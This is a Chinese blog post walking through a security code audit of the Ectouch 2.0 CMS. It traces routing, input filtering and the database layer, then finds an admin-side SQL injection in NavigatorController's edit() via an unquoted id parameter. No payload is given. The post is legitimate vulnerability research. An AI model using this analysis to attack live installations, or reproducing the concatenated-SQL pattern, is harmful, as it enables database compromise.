# Ectouch2.0 分析解读代码审计流程

阅读量 **410719**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-01-03 10:30:19

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/dm/1024_459_/t013c0ecb907d637952.jpg)

## 0x1 目录结构

显示目录结构:`tree -L 2 -C -d`

    
    
    ├── _docs
    ├── admin //默认后台目录
    │   ├── help
    │   ├── images
    │   ├── includes
    │   ├── js
    │   ├── styles
    │   └── templates
    ├── api
    │   └── notify
    ├── data //静态资源和系统缓存、配置目录
    │   ├── assets //静态资源目录    
    │   ├── attached //附件目录
    │   ├── backup //备份目录
    │   ├── caches //缓存目录
    │   ├── captcha //验证码图片
    │   ├── certificate //验证
    │   ├── codetable
    │   ├── ipdata
    │   ├── migrates
    │   ├── print
    │   ├── session
    │   ├── sqldata
    │   └── template
    ├── include //核心目录
    │   ├── apps //主程序(模块目录)
    │   ├── base //基础程序
    │   ├── classes //类文件
    │   ├── config //配置文件
    │   ├── helpers //助手函数
    │   ├── languages //语言包
    │   ├── libraries //主类库
    │   ├── modules //模块
    │   └── vendor //第三方扩展类
    ├── install //安装模块
    │   ├── sqldata
    │   └── templates
    ├── plugins //插件程序目录
    │   ├── connect
    │   ├── editor
    │   ├── integrates
    │   ├── payment
    │   ├── shipping
    │   └── wechat
    └── themes //系统默认模版目录
        └── ecmoban_zsxn
    

参考链接:

[ectouch第二讲之 文件结构](https://www.bbsmax.com/A/pRdB84OPJn/)

这样就可以确定重点是:`include` 文件夹

## 0x2 路由分析

入口文件`index.php`->引导文件`bootstrap.php`->`urlRoute()`路由解析->`dispatc()`路由调度

为了方便理解,我在这里分析下路由(这里有两种模式)

因为一般模式mvc都会用

`/index.php?m=admin&c=index&a=index`

所以在这里分析 **兼容模式下** 路由规则:

26-24 lines

    
    
            $varPath        =   C('VAR_PATHINFO');//c函数是获取配置参数的值
            $varModule      =   C('VAR_MODULE');
            $varController  =   C('VAR_CONTROLLER');
            $varAction      =   C('VAR_ACTION');
            $urlCase        =   C('URL_CASE_INSENSITIVE');
            if(isset($_GET[$varPath])) { // 判断URL里面是否有兼容模式参数
                $_SERVER['PATH_INFO'] = $_GET[$varPath]; //获取r=xx的内容给$_SERVER['PATH_INFO']
                unset($_GET[$varPath]); //释放变量
            }
    

41-59 lines

    
    
            $depr = C('URL_PATHINFO_DEPR'); //兼容模式分隔符 r
            define('MODULE_PATHINFO_DEPR',  $depr);    
    
            if(empty($_SERVER['PATH_INFO'])) {
                $_SERVER['PATH_INFO'] = '';
                define('__INFO__','');
                define('__EXT__','');
            }else{
                define('__INFO__',trim($_SERVER['PATH_INFO'],'/')); //去除多余的/
                // URL后缀
                define('__EXT__', strtolower(pathinfo($_SERVER['PATH_INFO'],PATHINFO_EXTENSION))); //获取文件后缀之后的内容
                $_SERVER['PATH_INFO'] = __INFO__; 
                if (__INFO__ && !defined('BIND_MODULE') && C('MULTI_MODULE')){ // 获取模块名
                    $paths      =   explode($depr,__INFO__,2);//切割__INFO__
                    $module     =   preg_replace('/.' . __EXT__ . '$/i', '',$paths[0]);//处理后缀
                    $_GET[$varModule]       =   $module;
                    $_SERVER['PATH_INFO']   =   isset($paths[1])?$paths[1]:'';
                }                   
            }
    

62-67 lines

    
    
             define('_PHP_FILE_', rtrim($_SERVER['SCRIPT_NAME'],'/'));//当前脚本文件目录 
            define('__SELF__',strip_tags($_SERVER[C('URL_REQUEST_URI')]));//URI(path+fragment)
            // 获取模块名称
            define('APP_NAME', defined('BIND_MODULE')? strtolower(BIND_MODULE) : self::getModule($varModule)); //getModule函数得到模块名 APP_NAME定义
            C('_APP_NAME', APP_NAME);
    

为了方便理解我继续跟进`getModule`函数

    
    
         */
        static private function getModule($var) { 
            $module = (!empty($_GET[$var])?$_GET[$var]:DEFAULT_APP); //前面处理的结果
            unset($_GET[$var]);//释放变量
            if($maps = C('URL_MODULE_MAP')) { //模块映射规则 默认跳过
                if(isset($maps[strtolower($module)])) {
                    // 记录当前别名
                    define('MODULE_ALIAS',strtolower($module));
                    // 获取实际的模块名
                    return ucfirst($maps[MODULE_ALIAS]);
                }elseif(array_search(strtolower($module),$maps)){
                    // 禁止访问原始模块
                    return   '';
                }
            }
            return strip_tags(strtolower($module)); //返回模块名
        }
    

70-86 lines

    
    
            if( APP_NAME && is_dir(APP_PATH.APP_NAME)){
                // 定义当前模块路径
                define('MODULE_PATH', APP_PATH.APP_NAME.'/');
    
                // 加载模块配置文件
                if(is_file(MODULE_PATH.'config/config.php'))
                    C(load_config(MODULE_PATH.'config/config.php'));
    
                // 加载模块函数文件
                if(is_file(MODULE_PATH.'helpers/function.php'))
                    include MODULE_PATH.'helpers/function.php';
    
                // 加载模块的扩展配置文件
                load_ext_file(MODULE_PATH);
            }else{
                E('模块不存在:'.APP_NAME);
            }
    这个作者的注释很明白 就是MODULE_PATH ->模块目录 + APP_NAME  ->模块名
    

107-150 lines

    
    
    if('' != $_SERVER['PATH_INFO'] && (!C('URL_ROUTER_ON') ||  !Route::check()) ){   // 检测路由规则 如果没有则按默认规则调度URL
    
                // 去除URL后缀
                $_SERVER['PATH_INFO'] = preg_replace(C('URL_HTML_SUFFIX')? '/.('.trim(C('URL_HTML_SUFFIX'),'.').')$/i' : '/.'.__EXT__.'$/i', '', $_SERVER['PATH_INFO']);
    
                $depr   =   C('URL_PATHINFO_DEPR'); //'-'
                $paths  =   explode($depr,trim($_SERVER['PATH_INFO'],$depr)); 
    
                if(!defined('BIND_CONTROLLER')) {// 获取控制器
                    if(C('CONTROLLER_LEVEL')>1){// 控制器层次 
                        $_GET[$varController]   =   implode('/',array_slice($paths,0,C('CONTROLLER_LEVEL')));
                        $paths  =   array_slice($paths, C('CONTROLLER_LEVEL'));
                    }else{
                        $_GET[$varController]   =   array_shift($paths); //取第一个作为控制器
                    }
                }
                // 获取操作
                if(!defined('BIND_ACTION')){
                    $_GET[$varAction]  =   array_shift($paths); //数组第二个为操作
                }
                // 解析剩余的URL参数
                $var = array(); //空
                if(C('URL_PARAMS_BIND') && 1 == C('URL_PARAMS_BIND_TYPE')){
                    $var = $paths; // URL参数按顺序绑定变量
                }else{
                    preg_replace_callback('/(w+)/([^/]+)/', function ($match) use (&$var) {
                        $var[$match[1]] = strip_tags($match[2]);
                    }, implode('/', $paths));
                }
                $_GET = array_merge($var,$_GET);  //合并变量
            }
            // 获取控制器和操作名
            define('CONTROLLER_NAME',   defined('BIND_CONTROLLER')? BIND_CONTROLLER : self::getController($varController,$urlCase)); 
            define('ACTION_NAME',       defined('BIND_ACTION')? BIND_ACTION : self::getAction($varAction,$urlCase));
    
            // 当前控制器的UR地址
            $controllerName    =   defined('CONTROLLER_ALIAS')? CONTROLLER_ALIAS : CONTROLLER_NAME;
            define('__CONTROLLER__',__MODULE__.$depr.(defined('BIND_CONTROLLER')? '': ( $urlCase ? parse_name($controllerName) : $controllerName )) );
    
            // 当前操作的URL地址
            define('__ACTION__',__CONTROLLER__.$depr.(defined('ACTION_ALIAS')?ACTION_ALIAS:ACTION_NAME));
    
            //保证$_REQUEST正常取值
            $_REQUEST = array_merge($_POST,$_GET);
    

简单跟进`getController` `getAction`

和前面一样重点是

`$controller = (!empty($_GET[$var])? $_GET[$var]:DEFAULT_CONTROLLER);`

和

`$action = !empty($_POST[$var]) ? $_POST[$var] :
(!empty($_GET[$var])?$_GET[$var]:DEFAULT_ACTION);`

没有映射规则就直接返回上面处理好的变量值了。

所以说这个`Dispatcher.php`文件主要作用是获取然后定义了三个变量:

`APP_NAME` 模块名

`CONTROLLER_NAME` 控制器名

`ACTION_NAME` 动作名

然后回到调用路由的页面`boostrap.php`引导页面

向下读就知道是怎么利用变量上面进行路由调用。

    
    
    urlRoute(); //这里是上面调用的路由调度
    
    try {
        /* 常规URL */
        defined('__HOST__') or define('__HOST__', get_domain());
        defined('__ROOT__') or define('__ROOT__', rtrim(dirname($_SERVER["SCRIPT_NAME"]), '\/')); 
        defined('__URL__') or define('__URL__', __HOST__ . __ROOT__);//地址栏url
        defined('__ADDONS__') or define('__ADDONS__', __ROOT__ . '/plugins');
        defined('__PUBLIC__') or define('__PUBLIC__', __ROOT__ . '/data/assets');
        defined('__ASSETS__') or define('__ASSETS__', __ROOT__ . '/data/assets/' . APP_NAME);
        /* 安装检测 */
        if (! file_exists(ROOT_PATH . 'data/install.lock')) {
            header("Location: ./install/");
            exit();
        }
        /* 控制器和方法 */
        $controller = CONTROLLER_NAME . 'Controller'; //这里传入的控制器名字拼接了'Controller'
        $action = ACTION_NAME; //操作名字就是前面的操作名字
        /* 控制器类是否存在 */
        if (! class_exists($controller)) { 
            E(APP_NAME . '/' . $controller . '.class.php 控制器类不存在', 404);
        }
        $controller = class_exists('MY_'. $controller) ? 'MY_'. $controller : $controller;
        $obj = new $controller();
        /* 是否非法操作 */
        if (! preg_match('/^[A-Za-z](w)*$/', $action)) { //这里正则匹配过滤一下只能是字母
            E(APP_NAME . '/' . $controller . '.class.php的' . $action . '() 方法不合法', 404);
        }
        /* 控制器类中的方法是否存在 */
        if (! method_exists($obj, $action)) {
            E(APP_NAME . '/' . $controller . '.class.php的' . $action . '() 方法不存在', 404);
        }
        /* 执行当前操作 */
        $method = new ReflectionMethod($obj, $action);
        if ($method->isPublic() && ! $method->isStatic()) {
            $obj->$action();
        } else {
            /* 操作方法不是Public 抛出异常 */
            E(APP_NAME . '/' . $controller . '.class.php的' . $action . '() 方法没有访问权限', 404);
        }
    } catch (Exception $e) {
        E($e->getMessage(), $e->getCode());
    }
    

正常调用简化下流程:`$obj = new $controller();`-> `$obj->$action()` 这样就成功调用

**0x0用例子总结一下调用规则:**

`http://127.0.0.1:8888/ecshop/upload/mobile/?r=admin-index-index`

调用的是:

`ecshop/upload/mobile/include/apps/admin/controllers/indexController` 下的
index方法

但是`class IndexController extends AdminController`

又是`AdminController`的子类,然后一层层继承,然后上层构造函数就会判断访问权限决定代码是否能执行到这里。

## 0x3 了解系统参数与底层过滤情况

####  0x3.1 原生GET,POST,REQUEST

> 测试方法:
>
> ​ 找个外部方法
>
> ![](https://ws1.sinaimg.cn/large/006tNbRwgy1fyqjyxc70jj31e80cqq8s.jpg)
>
> 然后随便传递值进去看看情况怎么样,如果有过滤就重新跟一次
>
> ![](https://ws3.sinaimg.cn/large/006tNbRwgy1fyqjz0fk8qj31is084acm.jpg)
>
> 可以看到过滤了`` `'` ,还做了实体化处理

粗读了入口文件,没发现有获取参数并且过滤地方,这个时候就可以跑去读基类`构造函数`寻找定义了

`include/apps/common/BaseController.class.php`

    
    
        public function __construct() {
            parent::__construct();
            $this->appConfig = C('APP');
            if ($this->_readHtmlCache()) {
                $this->appConfig['HTML_CACHE_ON'] = false;
                exit;
            }
            $this->_initialize(); //跟进这里
            $this->_common();
            Migrate::init();
        }
    
    
    
        private function _initialize() {
            //初始化设置
            ............
            //对用户传入的变量进行转义操作
            if (!get_magic_quotes_gpc()) {
                if (!empty($_GET)) {
                    $_GET = addslashes_deep($_GET);
                }
                if (!empty($_POST)) {
                    $_POST = addslashes_deep($_POST);
                }
                $_COOKIE = addslashes_deep($_COOKIE);
                $_REQUEST = addslashes_deep($_REQUEST);
         ..................
        }
    

//跟进`addslashes_deep`

    
    
    function addslashes_deep($value) {
        if (empty($value)) {
            return $value;
        } else {
            return is_array($value) ? array_map('addslashes_deep', $value) ://递归过滤数组值  addslashes($value);
        }
    }
    

Tips:

可以知道这里没有过滤键值

####  0x3.2 系统外部变量获取函数

**I方法(tp框架):**

    
    
    /**
     * 获取输入参数 支持过滤和默认值
     * 使用方法:
     * <code>
     * I('id',0); 获取id参数 自动判断get或者post
     * I('post.name','','htmlspecialchars'); 获取$_POST['name']
     * I('get.'); 获取$_GET
     * </code>
     * @param string $name 变量的名称 支持指定类型
     * @param mixed $default 不存在的时候默认值
     * @param mixed $filter 参数过滤方法
     * @param mixed $datas 要获取的额外数据源
     * @return mixed
     */
    

简单分析下代码:

    
    
        static $_PUT = null;
        if (strpos($name, '/')) {
            // 指定修饰符
            list($name, $type) = explode('/', $name, 2);
        } elseif (C('VAR_AUTO_STRING')) {
            // 默认强制转换为字符串
            $type = 's';
        }
        if (strpos($name, '.')) {
            // 指定参数来源
            list($method, $name) = explode('.', $name, 2); //post.id -> $method=post $name=id
        } else {
            // 默认为自动判断
        ........................
                    if (is_array($filters)) {
                    foreach ($filters as $filter) {
                        $filter = trim($filter);
                        if (function_exists($filter)) {
                            $data = is_array($data) ? array_map_recursive($filter, $data) : $filter($data); // 参数过滤
                        } else {
                            $data = filter_var($data, is_int($filter) ? $filter : filter_id($filter));
                            if (false === $data) {
                                return isset($default) ? $default : null;
                            }
                        }
                    }
                }
            }
    
           ..................
    
    function array_map_recursive($filter, $data)
    {
        $result = array();
        foreach ($data as $key => $val) {
            $result[$key] = is_array($val)
                ? array_map_recursive($filter, $val)
                : call_user_func($filter, $val); //调用传递进来的函数过滤 默认是htmlspecialchars
        }
        return $result;
    }
    

tips:

前面已经的得知原生已经被过滤,所以这个肯定被过滤了,但是如果调用`stripslashes` 函数来获取的话,

就有可能存在注入

Ex:

`$c = I('POST.','','stripslashes');`

###  0x3.3 查看系统DB类,了解数据库底层运行方式

由:`include/apps/common/BaseController.class.php`

    
    
            //创建 ECSHOP 对象
            self::$ecs = new EcsEcshop(C('DB_NAME'), C('DB_PREFIX'));
            //初始化数据库类
            self::$db = new EcsMysql(C('DB_HOST'), C('DB_USER'), C('DB_PWD'), C('DB_NAME'));
    

确定了`EcsMysql`类是系统的DB类

跟进`include/base/drivers/db/EcsMysql.class.php`

这里简单分析下运行原理:

    
    
    private function _connect($is_master = true) {
              ...............................
            foreach ($db_all as $db) {
                $mysqli = @new mysqli($db['DB_HOST'], $db['DB_USER'], $db['DB_PWD'], $db['DB_NAME'], $db['DB_PORT']); //这里是生成原生的mysqli数据库对象
                if ($mysqli->connect_errno == 0) {
                    break;
                }
            }
    
            if ($mysqli->connect_errno) {
                $this->error('无法连接到数据库服务器', $mysqli->connect_error, $mysqli->connect_errno);
            }
            //设置编码
            $mysqli->query("SET NAMES {$db['DB_CHARSET']}"); //设置了utf-8编码
            $mysqli->query("SET sql_mode=''");
            return $mysqli;
        }
    

这个`_connect`方法用于连接数据库然后返回数据库类对象

    
    
        //获取从服务器连接
        private function _getReadLink() {
            if (isset($this->_readLink)) { //$this->_readLink)初始为空 
                return $this->_readLink;
            } else {
                if (!$this->_replication) { 
                    return $this->_getWriteLink();
                } else {
                    $this->_readLink = $this->_connect(false); //这里获取了对象
                    return $this->_readLink;//返回对象
                }
            }
        }
    
        //获取主服务器连接
        private function _getWriteLink() {
            if (isset($this->_writeLink)) {
                return $this->_writeLink;
            } else {
                $this->_writeLink = $this->_connect(true);//同理
                return $this->_writeLink; 
            }
        }
    

`_getReadLink()` `_getWriteLink` 我没仔细去读,涉及到多个数据库调度的问题,但是他们的功能

都是获取$this->_connect(true) 返回的数据库对象

了解了上面的方法,那么就可以分析下面封装的函数了。

这里主要看几种查询方法:

分析下query方法,其他都差不多了

    
    
      //执行sql查询   
        public function query($sql, $params = array()) {
            foreach ($params as $k => $v) {
                $sql = str_replace(':' . $k, $this->escape($v), $sql);//跟进下当前类下的escape
            } //这里做了个替换:id->id 
            $this->sql = $sql;
            if ($query = $this->_getReadLink()->query($sql)) //这里进入了底层查询
                return $query;
            else
                $this->error('MySQL Query Error', $this->_getReadLink()->error, $this->_getReadLink()->errno); //获取错误信息
        }
    
    
    
        public function escape($value) {
            if (isset($this->_readLink)) {
                $mysqli = $this->_readLink;
            } elseif (isset($this->_writeLink)) {
                $mysqli = $this->_writeLink;
            } else {
                $mysqli = $this->_getReadLink();
            }
            //以上都是为了生成$mysqli对象
    
            if (is_array($value)) { //如果是数组
                return array_map(array($this, 'escape'), $value); //对数组键值进行递归调用当前函数
            } else {
                if (get_magic_quotes_gpc()) {
                    $value = stripslashes($value); //php5.4 gpc废除
                }
                return "'" . $mysqli->real_escape_string($value) . "'";//过滤掉sql的特殊字符'"等
            }
        }
    

然后分析下返回的结果:

    
    
        public function fetchArray($query, $result_type = MYSQLI_ASSOC) {
            return $this->unEscape($query->fetch_array($result_type));
        }
    

这里调用了`unEscape`->`stripslashes`去除了转义

`public function getFields($table)`

`public function count($table, $where)`

这两个函数参数都直接拼接了sql语句

这里在分析下解析`添加数据和where`的方法

    
    
        //解析待添加或修改的数据
        public function parseData($options, $type) {
            //如果数据是字符串，直接返回
            if (is_string($options['data'])) {
                return $options['data'];
            } 
            if (is_array($options) && !empty($options)) {//对数组进行处理
                switch ($type) {
                    case 'add':
                        $data = array(); //新建一个数组
                        $data['fields'] = array_keys($options['data']);//获取键名
                        $data['values'] = $this->escape(array_values($options['data']));//获取过滤的键值
                        return " (`" . implode("`,`", $data['fields']) . "`) VALUES (" . implode(",", $data['values']) . ") "; //拼接update语句
                    case 'save':
                        $data = array();
                        foreach ($options['data'] as $key => $value) {
                            $data[] = " `$key` = " . $this->escape($value);
                        }
                        return implode(',', $data);
                    default:return false;
                }
            }
            return false;
        }
    

这里可以知道没有对键值进行处理,所以如果可以控制`insert` and `update` 键值就可以进行注入。

    
    
        public function parseCondition($options) {
            $condition = "";
            if (!empty($options['where'])) {
                $condition = " WHERE ";
                if (is_string($options['where'])) {
                    $condition .= $options['where']; //如果是字符串直接拼接
                } else if (is_array($options['where'])) {
                    foreach ($options['where'] as $key => $value) {
                        $condition .= " `$key` = " . $this->escape($value) . " AND ";
                    }
                    $condition = substr($condition, 0, -4);
                } else {
                    $condition = "";
                }
            }
    
            if (!empty($options['group']) && is_string($options['group'])) {
                $condition .= " GROUP BY " . $options['group'];
            }
            if (!empty($options['having']) && is_string($options['having'])) {
                $condition .= " HAVING " . $options['having']; //直接拼接
            }
            if (!empty($options['order']) && is_string($options['order'])) {
                $condition .= " ORDER BY " . $options['order'];//直接拼接
            }
            if (!empty($options['limit']) && (is_string($options['limit']) || is_numeric($options['limit']))) {
                $condition .= " LIMIT " . $options['limit'];
            }
            if (empty($condition))
                return "";
            return $condition;
        }
    

这里可以看出来 `group having order limit where` 内容如果可控,那么就会产生注入

后面单独写了model类继承数据库驱动类来简化操作,所以分析几个点来了解

首先是控制器的基类实例化了model类:

`upload/mobile/include/apps/common/controllers/Controller.class.php`

    
    
    class Controller {
    
        protected $model = NULL; // 数据库模型
        protected $layout = NULL; // 布局视图
        private $_data = array();
    
        public function __construct() {
            $this->model = model('Base')->model; //实例话model类
            $this->cloud = Cloud::getInstance();
    

然后跟进model的定义和声明:

`EcModel.class.php`

    
    
        public function __construct($config = array()) {
            $this->config = array_merge(C('DB'), $config); //参数配置    
            $this->options['field'] = '*'; //默认查询字段
            $this->pre = $this->config['DB_PREFIX']; //数据表前缀
            $this->connect();
        }
    
        /**
         * 连接数据库
         */
        public function connect() {
            $dbDriver = 'Ec' . ucfirst($this->config['DB_TYPE']);
            require_once( dirname(__FILE__) . '/drivers/db/' . $dbDriver . '.class.php' );
            $this->db = new $dbDriver($this->config); //实例化数据库驱动类      
        }
    

这里可以看到实例化了数据库驱动类->$this->db

`Model.class.php`

    
    
    class Model {
    
        public $model = NULL;
        protected $db = NULL;
        protected $pre = NULL;
        protected $table = "";
        protected $ignoreTablePrefix = false;
    
        public function __construct($database = 'DB', $force = false) {
            $this->model = self::connect(C($database), $force);
            $this->db = $this->model->db; //数据库驱动类的实例
            $this->pre = $this->model->pre;
        }
    
        static public function connect($config, $force = false) {
            static $model = NULL;
            if ($force == true || empty($model)) {
                $model = new EcModel($config);
            }
            return $model;
        }
    

`$model = new EcModel($config);`->`$this->model`

model的调用方式了解下就可以分析下如何进行sql操作的了:

    
    
        public function query($sql, $params = array(), $is_query = false) {
            if (empty($sql))
                return false;
            $sql = str_replace('{pre}', $this->pre, $sql); //表前缀替换
            $this->sql = $sql;
            if ($this->queryCount++ <= 99)
            {
                $this->queryLog[] = $sql;
            }
            if ($this->queryTime == '') {
                if (PHP_VERSION >= '5.0.0') {
                    $this->queryTime = microtime(true);
                } else {
                    $this->queryTime = microtime();
                }
            }
            //判断当前的sql是否是查询语句
            if ($is_query || stripos(trim($sql), 'select') === 0) {
                $data = $this->_readCache();
                if (!empty($data)){
                    return $data;
                }
                $query = $this->db->query($this->sql, $params);//调用数据库驱动实例查询
                while ($row = $this->db->fetchArray($query)) {
                    $data[] = $row;
                }
                if (!is_array($data)) {
                    $data = array();
                }
                $this->_writeCache($data);
                return $data;
            } else {
                return $this->db->execute($this->sql, $params); //不是查询条件，直接执行
            }
        }
    

## 0x4 系统情况初步集合

xss漏洞不能带入单引号,原生全局变量可以带入双引号可能导致注入漏洞

    
    
    'DEBUG' => false, // 是否开启调试模式，true开启，false关闭
    

主要是全局的addslashes过滤,底层是escape过滤参数query过滤了特殊字符,还用单引号括起来,基本不可能默认关闭debug,所以没有报错注入,考虑盲注,联合注入但是可以考虑键值、二次注入和order等的注入。

其他漏洞xml,上传,包含,命令执行,文件读取、文件删除等这个可以通过搜索关键字进行逆向分析逻辑漏洞、越权针对功能点,分析权限分配规则等

## 0x5 前台注入

    
    
    .
    ├── AboutController.class.php
    ├── ActivityController.class.php
    ├── AfficheController.class.php
    ├── ApiController.class.php
    ├── ArticleController.class.php
    ├── AuctionController.class.php
    ├── BrandController.class.php
    ├── CategoryController.class.php
    ├── CommentController.class.php
    ├── CommonController.class.php
    ├── ExchangeController.class.php
    ├── FlowController.class.php
    ├── GoodsController.class.php
    ├── GroupbuyController.class.php
    ├── IndexController.class.php
    ├── OauthController.class.php
    ├── PublicController.class.php
    ├── RespondController.class.php
    ├── SmsController.class.php
    ├── SnatchController.class.php
    ├── TopicController.class.php
    ├── UserController.class.php
    ├── WechatController.class.php
    └── WholesaleController.class.php
    

​我花了差不多两个小时,一个一个控制器,一个一个model类地去看,可能是我太菜了

发现可控参数要么被intval掉,要么就是在model类被单引号括起来,也没找到啥可以绕过的函数,

这里没有审计出前台注入可能让大家失望了,但是考完试我会继续通读、细读代码,寻找到前台注入。

在这里,强烈跪求大师傅,可以审计下这个cms,然后指点下我该如何下手。

## 0x6 后台Navigator id union 注入

前台没希望,但是如果一个洞都没找到那么这个文章的价值就很难体现出来了

于是随手点了个后台控制器`mobile/include/apps/admin/controllers/NavigatorController.class.php`

结果拖着看看就发现了明显的注入点,后台应该还有其他注入点,但是我感觉后台注入真的鸡肋,这里为了更好的理解程序的运行原理,我就决定分析一波
**sql语句入库过程对应上面的分析** 。

下面分析操作主要是model类:`upload/mobile/include/apps/common/models/BaseModel.class.php`

//68 Lines

    
    
     public function edit() {
            $id = I('id'); //通过$_GET传递id的值可控
            if (IS_POST) { //跳过
                    ...............
            }
            //查询附表信息           
            $result = $this->model->table('touch_nav')->where('id=' . $id)->find(); //注入点
            /* 模板赋值 */
            $this->assign('info', $result);
            $this->assign('ur_here', L('navigator'));
            $this->assign('action_link', array('text' => L('go_list'), 'href' => url('index')));
            $this->display();
        }
    

`where('id=' . $id)` 这里很明显没有用单引号括起来,直接拼接变量

又因为是`where`后的所以可以导致联合查询。

这里跟进下流程:

`$this->model->table('touch_nav')`

    
    
        public function table($table, $ignorePre = false) {
            if ($ignorePre) { //跳过
                $this->options['table'] = $table;
            } else {
                $this->options['table'] = $this->config['DB_PREFIX'] . $table;
            }
            return $this;
        }
    

这里主要设置了`$this->options['table']`值,然后返回`$this` 去调用`where`方法

`$this->where('id=' . $id)` 跟进:

因为`where`方法不存在,调用__call构造函数,分析一波

    
    
        public function __call($method, $args) { 
            $method = strtolower($method);  //小写
            if (in_array($method, array('field', 'data', 'where', 'group', 'having', 'order', 'limit', 'cache'))) { //$method='where' 满足
                $this->options[$method] = $args[0]; //接收数据
                if ($this->options['field'] == '')
                    $this->options['field'] = '*';
                return $this; //返回对象，连贯查询
            } else {
                throw new Exception($method . '方法在EcModel.class.php类中没有定义');
            }
        }
    

可以看到主要是`$args[0`赋值给`$this->options[$method]`

(`$args='id=' . $id注入内容, $method='where'` )

然后继续返回了对象`$this->find()`

    
    
        public function find() {
            $this->options['limit'] = 1; //限制只查询一条数据
            $data = $this->select(); //开始进入查询
            return isset($data[0]) ? $data[0] : false;
        }
    

可以看到前面操作主要是把条件赋值给`$this->options`数组

`$data = $this->select();`进入查询,选择跟进

    
    
        public function select() {
            $table = $this->options['table']; //当前表
            $field = $this->options['field']; //查询的字段
            $where = $this->_parseCondition(); //条件
            return $this->query("SELECT $field FROM $table $where", array(), true);
        }
    

这里有个`$where = $this->_parseCondition();` 这个解析条件的函数上面没分析,这里选择分析一波,跟进

    
    
        private function _parseCondition() {
            $condition = $this->db->parseCondition($this->options);
            $this->options['where'] = '';
            $this->options['group'] = '';
            $this->options['having'] = '';
            $this->options['order'] = '';
            $this->options['limit'] = '';
            $this->options['field'] = '*';
            return $condition;
        }
    

这里就回到了我们开始讲的数据库驱动类实例`$this->db->parseCondition`

上面分析过了,字符串直接进行拼接,然后返回正常的`where`条件写法 ex`where id=1`

继续分析`$this->query("SELECT $field FROM $table $where", array(), true);`

    
    
         */
        public function query($sql, $params = array(), $is_query = false) {
            if (empty($sql))
                return false;
            $sql = str_replace('{pre}', $this->pre, $sql); //表前缀替换
            $this->sql = $sql;
            if ($this->queryCount++ <= 99)
            {
                $this->queryLog[] = $sql;
            }
            if ($this->queryTime == '') {
                if (PHP_VERSION >= '5.0.0') {
                    $this->queryTime = microtime(true);
                } else {
                    $this->queryTime = microtime();
                }
            }
            //判断当前的sql是否是查询语句
            if ($is_query || stripos(trim($sql), 'select') === 0) {
                $data = $this->_readCache();
                if (!empty($data)){
                    return $data;
                }
                $query = $this->db->query($this->sql, $params);
                while ($row = $this->db->fetchArray($query)) {
                    $data[] = $row;
                }
                if (!is_array($data)) {
                    $data = array();
                }
                $this->_writeCache($data);
                return $data;
            } else {
                return $this->db->execute($this->sql, $params); //不是查询条件，直接执行
            }
        }
    

分析过了 `query`查询了,`$query = $this->db->query($this->sql, $params);`
进入数据库驱动类实例,这个前面也分析过了,字符串直接进入原生查询,这里就知道完整入库了。

**关于利用(如果后台注入还需要盲注那真的太low了)** :

`$this->assign('info', $result);` 这里把sql查询的结果反回来了,跟进

    
    
        protected function assign($name, $value) {
            return $this->tpl()->assign($name, $value);
        }
    

`$this->tpl()`->`assign`

    
    
        public function assign($name, $value = '') {
            if (is_array($name)) {
                foreach ($name as $k => $v) {
                    $this->vars[$k] = $v;
                }
            } else {
                $this->vars[$name] = $value;
            }
        }
    

设置了`$this->vars[$name]`

    
    
            /* 模板赋值 */
            $this->assign('info', $result);
            $this->assign('ur_here', L('navigator'));
            $this->assign('action_link', array('text' => L('go_list'), 'href' => url('index')));
            $this->display();
    

这里想看如何渲染模版,跟进`$this->display();`

    
    
        protected function display($tpl = '', $return = false, $is_tpl = true) {
            if ($is_tpl) {
                $tpl = empty($tpl) ? strtolower(CONTROLLER_NAME . '_' . ACTION_NAME) : $tpl;
                if ($is_tpl && $this->layout) {
                    $this->__template_file = $tpl;
                    $tpl = $this->layout;
                }
            }
            $this->tpl()->config ['TPL_TEMPLATE_PATH'] = BASE_PATH . 'apps/' . C('_APP_NAME') . '/view/';
            $this->tpl()->assign($this->_data);
            return $this->tpl()->display($tpl, $return, $is_tpl);
        }
    

然后进入:

    
    
     public function display($tpl = '', $return = false, $is_tpl = true) {
            //如果没有设置模板，则调用当前模块的当前操作模板
            if ($is_tpl && ($tpl == "") && (!empty($_GET['_module'])) && (!empty($_GET['_action']))) {
                $tpl = $_GET['_module'] . "/" . $_GET['_action'];
            }
            if ($return) {
                if (ob_get_level()) {
                    ob_end_flush();
                    flush();
                }
                ob_start();
            }
            extract($this->vars, EXTR_OVERWRITE);
            if ($is_tpl && $this->config['TPL_CACHE_ON']) {
                define('ECTOUCH', true);
                $tplFile = $this->config['TPL_TEMPLATE_PATH'] . $tpl . $this->config['TPL_TEMPLATE_SUFFIX'];
                $cacheFile = $this->config['TPL_CACHE_PATH'] . md5($tplFile) . $this->config['TPL_CACHE_SUFFIX'];
    
                if (!file_exists($tplFile)) {
                    throw new Exception($tplFile . "模板文件不存在");
                }
                //普通的文件缓存
                if (empty($this->config['TPL_CACHE_TYPE'])) {
                    if (!is_dir($this->config['TPL_CACHE_PATH'])) {
                        @mkdir($this->config['TPL_CACHE_PATH'], 0777, true);
                    }
                    if ((!file_exists($cacheFile)) || (filemtime($tplFile) > filemtime($cacheFile))) {
                        file_put_contents($cacheFile, "<?php if (!defined('ECTOUCH')) exit;?>" . $this->compile($tpl)); //写入缓存
                    }
                    include( $cacheFile ); //加载编译后的模板缓存
                } else {
                    //支持memcache等缓存
                    $tpl_key = md5(realpath($tplFile));
                    $tpl_time_key = $tpl_key . '_time';
                    static $cache = NULL;
                    $cache = is_object($cache) ? $cache : new EcCache($this->config, $this->config['TPL_CACHE_TYPE']);
                    $compile_content = $cache->get($tpl_key);
                    if (empty($compile_content) || (filemtime($tplFile) > $cache->get($tpl_time_key))) {
                        $compile_content = $this->compile($tpl);
                        $cache->set($tpl_key, $compile_content, 3600 * 24 * 365); //缓存编译内容
                        $cache->set($tpl_time_key, time(), 3600 * 24 * 365); //缓存编译内容
                    }
                    eval('?>' . $compile_content);
                }
            } else {
                eval('?>' . $this->compile($tpl, $is_tpl)); //直接执行编译后的模板
            }
    
            if ($return) {
                $content = ob_get_contents();
                ob_end_clean();
                return $content;
            }
        }
    

`extract($this->vars, EXTR_OVERWRITE);` 这里开始生成符号表的变量,然后进入编译,然后匹配替换掉模版的值

然后你去模版看看`navigator_edit.html` 查看相应的变量

    
    
                  <input type='text' name='data[name]' maxlength="20" value='{$info['name']}' class="form-control input-sm" />
